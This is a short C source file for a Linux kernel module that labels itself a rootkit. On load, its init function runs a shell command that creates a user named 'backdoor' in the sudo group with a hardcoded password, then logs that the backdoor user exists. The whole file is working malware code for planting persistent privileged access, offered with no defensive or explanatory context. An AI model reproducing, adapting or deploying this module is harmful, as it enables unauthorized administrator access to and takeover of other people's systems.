#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

static int __init rootkit_init(void) {
    char *argv[] = {"/bin/sh", "-c", "id backdoor || useradd -m -G sudo -s /bin/bash backdoor && echo 'backdoor:rootpass' | chpasswd", NULL};
    static char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO "Backdoor user created (or already exists).\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit Unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
